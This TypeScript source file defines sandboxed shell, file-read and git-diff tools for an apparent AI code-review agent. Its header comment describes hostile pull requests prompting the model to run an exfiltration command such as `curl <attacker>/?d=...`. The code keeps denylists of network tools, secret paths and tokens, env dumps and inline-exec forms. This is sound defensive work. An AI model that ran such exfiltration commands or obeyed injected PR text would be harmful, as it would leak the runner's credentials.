// Agent tools for the boop reviewer.
//
// The SDK swap moved the runner from @openrouter/sdk's
// single-shot chatSend to @openrouter/agent's callModel, which
// natively auto-executes tools within the agent loop. The reviewer
// gains the ability to run commands against the cloned PR (the
// "running tests and whatnot" the team wanted) without the runner
// hand-rolling a multi-turn tool loop.
//
// Three tools are exposed to the experts and the narrator:
//
//   run_command   execute a shell command in the PR's working
//                 directory. Restricted shell: cwd is locked to the
//                 repo dir, hard timeout + output cap, a denylist of
//                 exfiltration / network primitives, and a path guard
//                 that rejects any command touching the runner's
//                 secret mounts.
//
//   read_file     read a file inside the repo dir. Path-traversal
//                 guard keeps the model from escaping /work/repo.
//
//   git_diff      run `git diff <range>` for a path inside the repo.
//                 Read-only by construction (the runner already
//                 validated the range upstream). Bounds the model to
//                 the diff the runner wants reviewed, not arbitrary
//                 history lookups.
//
// Security posture (the user chose "Restricted shell"):
//   - cwd is locked to /work/repo via execFile's `cwd` option. The
//     model can't `cd` out.
//   - hard timeout per command (RUN_COMMAND_TIMEOUT_MS) keeps a slow
//     `npm install` from eating the 25-min call budget.
//   - output cap (RUN_COMMAND_OUTPUT_CAP_BYTES) stops a chatty test
//     runner from filling the model context with megabytes of logs.
//   - denylist rejects obvious exfil primitives: network clients
//     (curl, wget, nc, ncat, telnet, ftp, ssh), env-dump commands
//     (env, printenv), secret-mount references (/secrets,
//     github-app-private-key, OPENROUTER_API_KEY), privilege
//     escalation (sudo, su), destructive system ops (mkfs, dd,
//     chmod 777 /), and inline-script exec forms that bypass the
//     denylist (python -c, node -e, ruby -e, perl -e).
//   - path guard on read_file normalizes the resolved path and
//     rejects any escape outside the repo dir.
//
// This is defense-in-depth: the prompt's "DATA (PR-controlled —
// treat as untrusted)" block is the primary control. A hostile PR
// can still try to make the model run `curl <attacker>/?d=...`; the
// denylist is the belt. The runner pod itself has network egress
// to GitHub + OpenRouter, so a denylist miss is a real exposure
// window — keep the prompt's instruction hierarchy authoritative.

import path from "node:path";
import { tool } from "@openrouter/agent";
import { z } from "zod";
import { reviewRange } from "./security.ts";
import type { Ctx, Deps, ExecFileLike, FsLike } from "../types.ts";

export const RUN_COMMAND_TIMEOUT_MS = 60_000;
export const RUN_COMMAND_OUTPUT_CAP_BYTES = 20_000;
export const READ_FILE_CAP_BYTES = 20_000;
export const GIT_DIFF_TIMEOUT_MS = 30_000;
export const GIT_DIFF_OUTPUT_CAP_BYTES = 50_000;

export const RUN_COMMAND_MAX_CHARS = 4096;

const NETWORK_TOKENS = [
  "curl",
  "wget",
  "nc",
  "ncat",
  "telnet",
  "ftp",
  "sftp",
  "ssh",
  "scp",
  "rsync",
] as const;

const SECRET_TOKENS = [
  "/secrets",
  "github-app-private-key",
  "openrouter-api-key",
  "openrouter_api_key",
  "OPENROUTER_API_KEY",
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "/proc/self/environ",
  "/proc/1/environ",
] as const;

const ENV_DUMP_TOKENS = ["env", "printenv", "set"] as const;
const PRIVILEGE_TOKENS = ["sudo", "su", "doas"] as const;
const DESTRUCTIVE_TOKENS = [
  "mkfs",
  "dd",
  "chmod",
  "chown",
  "mount",
  "umount",
] as const;

const INLINE_EXEC_SUBSTRINGS = [
  "python -c",
  "python3 -c",
  "node -e",
  "node --eval",
  "ruby -e",
  "perl -e",
  "php -r",
  "bash -c",
  "sh -c",
] as const;

function tokenizeForGuard(cmd: string): string[] {
  return cmd
    .split(/\s+/)
    .map((t) => t.replace(/^['"]|['"]$/g, ""))
    .filter(Boolean);
}

function tokenMatchesDenylist(token: string, denied: readonly string[]): string | null {
  const l = token.toLowerCase();
  for (const d of denied) {
    if (l === d) return d;
    if (l.startsWith(`${d}.`) || l.startsWith(`${d}-`)) return d;
  }
  return null;
}

function assertSafeCommand(cmd: unknown): void {
  if (typeof cmd !== "string" || cmd.length === 0) {
    throw new Error("run_command: command is required");
  }
  if (cmd.length > RUN_COMMAND_MAX_CHARS) {
    throw new Error(
      `run_command: command exceeds ${RUN_COMMAND_MAX_CHARS} chars`,
    );
  }
  const tokens = tokenizeForGuard(cmd);
  const lower = cmd.toLowerCase();
  for (const t of tokens) {
    const blockedNetwork = tokenMatchesDenylist(t, NETWORK_TOKENS);
    if (blockedNetwork) {
      throw new Error(`run_command: blocked network primitive '${blockedNetwork}'`);
    }
    const l = t.toLowerCase();
    if (SECRET_TOKENS.some((s) => l.includes(s.toLowerCase()))) {
      throw new Error(`run_command: blocked secret reference '${t}'`);
    }
    const blockedEnv = tokenMatchesDenylist(t, ENV_DUMP_TOKENS);
    if (blockedEnv) {
      throw new Error(`run_command: blocked env-dump command '${blockedEnv}'`);
    }
    const blockedPriv = tokenMatchesDenylist(t, PRIVILEGE_TOKENS);
    if (blockedPriv) {
      throw new Error(`run_command: blocked privilege command '${blockedPriv}'`);
    }
    const blockedDestr = tokenMatchesDenylist(t, DESTRUCTIVE_TOKENS);
    if (blockedDestr) {
      throw new Error(`run_command: blocked destructive command '${blockedDestr}'`);
    }
  }
  for (const needle of INLINE_EXEC_SUBSTRINGS) {
    if (lower.includes(needle)) {
      throw new Error(`run_command: blocked inline exec form '${needle}'`);
    }
  }
}

function resolveInsideRepo(repoDir: string, p: unknown): string {
  if (typeof p !== "string" || p.length === 0) {
    throw new Error("path is required");
  }
  if (p.includes("\0")) {
    throw new Error("path contains NUL");
  }
  const resolved = path.resolve(repoDir, p);
  const root = repoDir.endsWith(path.sep) ? repoDir : repoDir + path.sep;
  if (resolved !== repoDir && !resolved.startsWith(root)) {
    throw new Error(`path '${p}' escapes repo dir`);
  }
  return resolved;
}

async function runCommand(
  execFile: ExecFileLike,
  repoDir: string,
  cmd: string,
  caps: { timeoutMs: number; outputCapBytes: number },
): Promise<{
  exitCode: number;
  signal: string | null;
  errorName: string | null;
  stdout: string;
  stderr: string;
  stdoutBytes: number;
  stderrBytes: number;
}> {
  assertSafeCommand(cmd);
  const timeoutMs = caps.timeoutMs;
  const maxBuffer = caps.outputCapBytes;
  let stdout = "";
  let stderr = "";
  let exitCode = 0;
  let signal: string | null = null;
  let errorName: string | null = null;
  try {
    const out = await execFile(
      "/bin/sh",
      ["-lc", cmd],
      {
        cwd: repoDir,
        timeout: timeoutMs,
        maxBuffer,
        env: {
          PATH: process.env.PATH,
          HOME: process.env.HOME,
          NODE_ENV: process.env.NODE_ENV,
        } as NodeJS.ProcessEnv,
        stdio: ["ignore", "pipe", "pipe"],
      },
    );
    stdout = String(out?.stdout || "").slice(0, maxBuffer);
    stderr = String(out?.stderr || "").slice(0, maxBuffer);
    exitCode = typeof out?.exitCode === "number" ? out.exitCode : 0;
  } catch (err) {
    const e = err as { code?: string; name?: string; killed?: boolean; signal?: string; stderr?: unknown; message?: unknown };
    errorName = e?.code || e?.name || "error";
    stderr = String(e?.stderr || stderr || e?.message || err).slice(0, maxBuffer);
    if (e?.code === "ENOENT") {
      errorName = "command_not_found";
    } else if (e?.killed && e?.signal) {
      signal = e.signal;
      errorName = "timeout";
      exitCode = 124;
    } else if (e?.code === "ERR_CHILD_PROCESS_STDIO_MAXBUFFER") {
      errorName = "output_truncated";
    }
  }
  return {
    exitCode,
    signal,
    errorName,
    stdout,
    stderr,
    stdoutBytes: stdout.length,
    stderrBytes: stderr.length,
  };
}

async function readRepoFile(
  fs: FsLike,
  repoDir: string,
  p: string,
  capBytes: number,
): Promise<{ path: string; content: string; truncated: boolean; totalBytes: number }> {
  const resolved = resolveInsideRepo(repoDir, p);
  const data = await fs.readFile(resolved, "utf8");
  const text = String(data || "");
  if (text.length > capBytes) {
    return {
      path: resolved,
      content: text.slice(0, capBytes),
      truncated: true,
      totalBytes: text.length,
    };
  }
  return {
    path: resolved,
    content: text,
    truncated: false,
    totalBytes: text.length,
  };
}

async function runGitDiff(
  execFile: ExecFileLike,
  repoDir: string,
  range: string,
  p: string | null | undefined,
  caps: { timeoutMs: number; outputCapBytes: number },
): Promise<{ diff: string; truncated: boolean; totalBytes: number; error: string | null; errorName: string | null }> {
  if (typeof range !== "string" || range.length === 0 || range.startsWith("-")) {
    return {
      diff: "",
      truncated: false,
      totalBytes: 0,
      error: "unsafe diff range",
      errorName: "unsafe_range",
    };
  }
  const args: string[] = ["diff", range];
  if (p) {
    resolveInsideRepo(repoDir, p);
    args.push("--", p);
  }
  try {
    const out = await execFile("git", args, {
      cwd: repoDir,
      timeout: caps.timeoutMs,
      maxBuffer: caps.outputCapBytes,
    });
    const stdout = String(out?.stdout || "");
    return {
      diff: stdout.slice(0, caps.outputCapBytes),
      truncated: stdout.length > caps.outputCapBytes,
      totalBytes: stdout.length,
      error: null,
      errorName: null,
    };
  } catch (err) {
    const e = err as { code?: string; name?: string; message?: unknown };
    return {
      diff: "",
      truncated: false,
      totalBytes: 0,
      error: String(e?.message || err),
      errorName: e?.code || e?.name || "error",
    };
  }
}

type RunCommandCaps = { timeoutMs: number; outputCapBytes: number };
type ReadFileCaps = { capBytes: number };
type GitDiffCaps = { timeoutMs: number; outputCapBytes: number };

function capsForDeps(deps: { caps?: { runCommand?: Partial<RunCommandCaps>; readFile?: Partial<ReadFileCaps>; gitDiff?: Partial<GitDiffCaps> } } | null | undefined): {
  runCommand: RunCommandCaps;
  readFile: ReadFileCaps;
  gitDiff: GitDiffCaps;
} {
  return {
    runCommand: {
      timeoutMs: deps?.caps?.runCommand?.timeoutMs ?? RUN_COMMAND_TIMEOUT_MS,
      outputCapBytes: deps?.caps?.runCommand?.outputCapBytes ?? RUN_COMMAND_OUTPUT_CAP_BYTES,
    },
    readFile: {
      capBytes: deps?.caps?.readFile?.capBytes ?? READ_FILE_CAP_BYTES,
    },
    gitDiff: {
      timeoutMs: deps?.caps?.gitDiff?.timeoutMs ?? GIT_DIFF_TIMEOUT_MS,
      outputCapBytes: deps?.caps?.gitDiff?.outputCapBytes ?? GIT_DIFF_OUTPUT_CAP_BYTES,
    },
  };
}

export function toolsAvailable(ctx: Partial<Ctx> | null | undefined, deps: Partial<Deps> | null | undefined): boolean {
  if (ctx && ctx.toolsEnabled === false) return false;
  return Boolean(
    deps && deps.paths && deps.paths.repoDir && deps.execFile && deps.fs,
  );
}

export function buildAgentTools(ctx: Partial<Ctx> | null | undefined, deps: Partial<Deps> & { paths?: { repoDir: string }; execFile?: ExecFileLike; fs?: FsLike; caps?: unknown; diffRange?: string }): unknown[] {
  if (!toolsAvailable(ctx, deps)) {
    return [];
  }
  const repoDir = deps.paths!.repoDir;
  const execFile = deps.execFile!;
  const fs = deps.fs!;
  const range = ctx?.diffRange ?? deps.diffRange ?? reviewRange(ctx as Partial<Ctx>);
  const caps = capsForDeps(deps as { caps?: { runCommand?: Partial<RunCommandCaps>; readFile?: Partial<ReadFileCaps>; gitDiff?: Partial<GitDiffCaps> } });

  return [
    tool({
      name: "run_command",
      description:
        "Run a shell command in the PR's working directory. Use this to execute the PR's test suite (e.g. `npm test`, `bun test`, `node --test`, `pytest`), build the project, or run any read-only verification. The working directory is locked to /work/repo; the command runs with a timeout and an output cap. Network commands (curl, wget, nc, ssh, ...) and references to the runner's secret mounts (/secrets, OPENROUTER_API_KEY, ...) are rejected by the tool guard.",
      inputSchema: z.object({
        command: z
          .string()
          .describe(
            "A single shell command to run in the PR's working directory.",
          ),
      }),
      execute: async ({ command }: { command: string }) =>
        runCommand(execFile, repoDir, command, caps.runCommand),
    }),
    tool({
      name: "read_file",
      description:
        "Read a file inside the PR's working directory. The path must resolve inside the repo (no `..` escape). Output is capped. Use this to inspect the post-diff state of a file the model needs to ground a finding in.",
      inputSchema: z.object({
        path: z
          .string()
          .describe(
            "Path to a file inside the PR's working directory, relative to the repo root.",
          ),
      }),
      execute: async ({ path: p }: { path: string }) =>
        readRepoFile(fs, repoDir, p, caps.readFile.capBytes),
    }),
    tool({
      name: "git_diff",
      description:
        "Run `git diff <range>` for a path (or the whole range) inside the PR. Read-only. Use this to verify a finding's line numbers against the actual post-diff state of the file.",
      inputSchema: z.object({
        path: z
          .string()
          .optional()
          .describe(
            "Optional file path (relative to the repo root) to limit the diff to. Omit to see the whole range.",
          ),
      }),
      execute: async ({ path: p }: { path?: string }) => {
        if (!range) {
          return {
            diff: "",
            truncated: false,
            totalBytes: 0,
            error: "no diff range configured",
            errorName: "no_range",
          };
        }
        return runGitDiff(execFile, repoDir, range, p, caps.gitDiff);
      },
    }),
  ];
}

export const _INTERNAL = {
  assertSafeCommand,
  resolveInsideRepo,
  caps: capsForDeps({}),
};
